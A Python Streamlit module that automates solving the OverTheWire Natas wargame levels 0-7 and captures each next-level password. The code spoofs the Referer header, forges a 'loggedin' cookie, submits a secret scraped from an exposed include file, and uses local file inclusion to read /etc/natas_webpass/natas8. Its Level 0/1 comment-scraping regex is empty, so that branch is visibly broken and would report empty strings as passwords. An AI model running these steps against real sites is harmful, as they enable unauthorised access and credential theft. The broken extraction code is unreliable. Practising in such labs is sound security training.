import streamlit as st
import re
from .utils import initialize_http_session

def execute(level_name, context):
    st.markdown(f"### 📋 Running: {level_name}")
    
    session = initialize_http_session(context)
    base_url = context['url'].rstrip('/')
    
    # =========================================================================
    # LEVELS 0 & 1: Source Code Comment Scraping
    # =========================================================================
    if level_name in ["Level 0", "Level 1"]:
        st.info(f"{level_name} selected: Scraping source comment arrays...")
        try:
            response = session.get(base_url, timeout=10)
            if response.status_code == 200:
                st.success("Successfully fetched page source.")
                
                # Extract 32-character tokens inside HTML comment strings
                all_tokens = re.findall(r'', response.text, re.DOTALL)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                
                if valid_tokens:
                    next_lvl = int(level_name.split()[-1]) + 1
                    st.success(f"🎯 Password for Level {next_lvl} captured!")
                    st.code(f"Natas {next_lvl} Password: {valid_tokens[0]}")
                else:
                    st.warning("No password tokens found embedded inside source comments.")
                    with st.expander("View Clean Source Canvas"):
                        st.code(response.text, language="html")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 2: Directory Indexing File Disclosure
    # =========================================================================
    elif level_name == "Level 2":
        st.info("Level 2 selected: Targeting the exposed directory indexing path...")
        target_directory_url = f"{base_url}/files/"
        try:
            dir_response = session.get(target_directory_url, timeout=10)
            if dir_response.status_code == 200:
                st.success("Successfully accessed the `/files/` directory listing.")
                file_match = re.search(r'href="([^"]+\.txt)"', dir_response.text)
                
                if file_match:
                    target_file = file_match.group(1)
                    st.write(f"📂 Identified potentially sensitive file: `{target_file}`")
                    file_url = f"{target_directory_url}{target_file}"
                    file_response = session.get(file_url, timeout=10)
                    
                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', file_response.text)
                    valid_tokens = [t for t in all_tokens if t != context['password']]
                    
                    if valid_tokens:
                        st.success(f"🎯 Successfully extracted token for the next level!")
                        st.code(f"Natas 3 Password: {valid_tokens[0]}")
                    else:
                        st.warning("No new 32-character tokens found inside the target file.")
                else:
                    st.error("Could not find any text file links inside the directory listing.")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 3: Information Disclosure via robots.txt
    # =========================================================================
    elif level_name == "Level 3":
        st.info("Level 3 selected: Checking the `robots.txt` file for hidden asset directories...")
        robots_url = f"{base_url}/robots.txt"
        try:
            robots_res = session.get(robots_url, timeout=10)
            if robots_res.status_code == 200:
                st.success("Successfully read `robots.txt` from server root.")
                hidden_paths = re.findall(r'Disallow:\s*([^\s\n]+)', robots_res.text)
                
                if hidden_paths:
                    secret_dir = hidden_paths[0].strip('/')
                    st.write(f"🔍 Discovered restricted directory path: `/{secret_dir}/`")
                    secret_url = f"{base_url}/{secret_dir}/"
                    secret_res = session.get(secret_url, timeout=10)
                    
                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', secret_res.text)
                    file_match = re.search(r'href="([^"]+\.txt)"', secret_res.text)
                    
                    if file_match:
                        specific_file_url = f"{secret_url}{file_match.group(1)}"
                        specific_file_res = session.get(specific_file_url, timeout=10)
                        all_tokens += re.findall(r'\b[A-Za-z0-9]{32}\b', specific_file_res.text)
                        
                    valid_tokens = [t for t in all_tokens if t != context['password']]
                    if valid_tokens:
                        st.success("🎯 Successfully navigated directory exclusions and captured flag!")
                        st.code(f"Natas 4 Password: {valid_tokens[0]}")
                    else:
                        st.warning("Could not automatically locate a new token string in the secret folder.")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 4: HTTP Referer Header Spoofing
    # =========================================================================
    elif level_name == "Level 4":
        st.info("Level 4 selected: Emulating authorized HTTP Referer tracking header...")
        custom_headers = {
            "User-Agent": context["user_agent"],
            "Referer": "http://natas5.natas.labs.overthewire.org/"
        }
        try:
            response = session.get(base_url, headers=custom_headers, timeout=10)
            if response.status_code == 200:
                st.success("Target endpoint processed modified header state cleanly.")
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                if valid_tokens:
                    st.success("🎯 Referer modification bypass verified!")
                    st.code(f"Natas 5 Password: {valid_tokens[0]}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 5: Session Cookie Status Overriding
    # =========================================================================
    elif level_name == "Level 5":
        st.info("Level 5 selected: Injecting authorization value into the session cookie map...")
        session.cookies.set("loggedin", "1", domain="natas5.natas.labs.overthewire.org")
        try:
            response = session.get(base_url, timeout=10)
            if response.status_code == 200:
                st.success("Target context boundary read modification state cleanly.")
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                if valid_tokens:
                    st.success("🎯 Cookie parameter injection bypass verified!")
                    st.code(f"Natas 6 Password: {valid_tokens[0]}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 6: Configuration File Secret Extraction & POST Request Handling
    # =========================================================================
    elif level_name == "Level 6":
        st.info("Level 6 selected: Fetching key parameters from the `includes/` subdirectory...")
        secret_include_url = f"{base_url}/includes/secret.inc"
        try:
            include_response = session.get(secret_include_url, timeout=10)
            
            if include_response.status_code == 200:
                st.success("Successfully accessed the `includes/secret.inc` data block.")
                raw_text = include_response.text.strip()
                secret_match = re.search(r'\$secret\s*=\s*"([^"]+)"', raw_text)
                
                if secret_match:
                    retrieved_secret = secret_match.group(1)
                else:
                    retrieved_secret = raw_text if len(raw_text) > 0 and "<?php" not in raw_text else None

                if retrieved_secret:
                    st.write(f"🔑 Extracted Verification Key: `{retrieved_secret}`")
                    post_payload = {
                        "secret": retrieved_secret,
                        "submit": "Submit"
                    }
                    st.info("Submitting payload parameter to the form handler via POST...")
                    execution_response = session.post(base_url, data=post_payload, timeout=10)
                    
                    all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', execution_response.text)
                    valid_tokens = [t for t in all_tokens if t != context['password']]
                    
                    if valid_tokens:
                        st.success("🎯 Form authentication successful!")
                        st.code(f"Natas 7 Password: {valid_tokens[0]}")
                    else:
                        st.warning("Could not extract a brand new 32-character token string.")
                        with st.expander("View Server Post-Response Canvas"):
                            st.code(execution_response.text, language="html")
                else:
                    st.error("Failed to parse an active secret value from the include file layer.")
            else:
                st.error(f"Failed to reach inclusion file directory. HTTP code: {include_response.status_code}")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")

    # =========================================================================
    # LEVEL 7: Arbitrary Query Traversal (LFI Injection)
    # =========================================================================
    elif level_name == "Level 7":
        st.info("Level 7 selected: Executing local file inclusion query parameter routing...")
        target_file_path = "/etc/natas_webpass/natas8"
        request_parameters = {"page": target_file_path}
        try:
            response = session.get(base_url, params=request_parameters, timeout=10)
            if response.status_code == 200:
                st.success("The target instance processed the parameter routing path successfully.")
                all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
                valid_tokens = [t for t in all_tokens if t != context['password']]
                if valid_tokens:
                    st.success("🎯 Path parameter traversal validated!")
                    st.code(f"Natas 8 Password: {valid_tokens[0]}")
                else:
                    st.warning("Could not automatically locate an isolated 32-character pattern block.")
                    with st.expander("View Server Document Canvas"):
                        st.code(response.text, language="html")
        except Exception as e:
            st.error(f"Module execution failed: {str(e)}")
            
    # =========================================================================
    # FALLBACK ENGINE: Generic Baseline Execution Layout
    # =========================================================================
    else:
        st.info(f"Targeting baseline configuration content for generic processing...")
        try:
            response = session.get(base_url, timeout=10)
            st.success("Handshake completed successfully.")
            all_tokens = re.findall(r'\b[A-Za-z0-9]{32}\b', response.text)
            valid_tokens = [t for t in all_tokens if t != context['password']]
            if valid_tokens:
                st.code(f"Extracted Token: {valid_tokens[0]}")
        except Exception as e:
            st.error(f"Error executing fallback module: {str(e)}")